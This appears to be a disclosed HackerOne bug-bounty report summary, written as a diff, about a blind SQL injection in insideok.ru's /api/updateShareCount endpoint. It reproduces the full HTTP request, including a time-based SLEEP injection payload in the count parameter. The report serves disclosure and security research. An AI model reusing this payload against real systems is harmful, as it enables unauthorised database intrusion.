@@ -1,0 +1,29 @@
+ReportLink:https://hackerone.com/reports/221757
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/linkks
+ReportedTo:ok.ru(ok)
+BountyAmount:300.0
+Severity:critical
+State:Closed
+DateOfDisclosure:20.04.2017 16:51:53
+
+Summary:
+@linkks reported a blind sql injection:
+
+> POST /api/updateShareCount HTTP/1.1
+> Host: insideok.ru
+> Cache-Control: no-cache
+> Accept: application/json, text/javascript, /; q=0.01
+> Origin: http://insideok.ru
+> Referer: http://insideok.ru/lica
+> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+> X-Requested-With: XMLHttpRequest
+> Accept-Language: en-us,en;q=0.5
+> Cookie: session=27e8i3jqiutlk7bd2nmgoftbg0
+> Accept-Encoding: gzip, deflate
+> Content-Length: 108
+> Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+> type=sharesCountTw&url=http%3a%2f%2finsideok.ru%2flica&count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))
+
+insideok.ru is corporate blog and out of the program scope. There was no risk for the main domain and users' data.
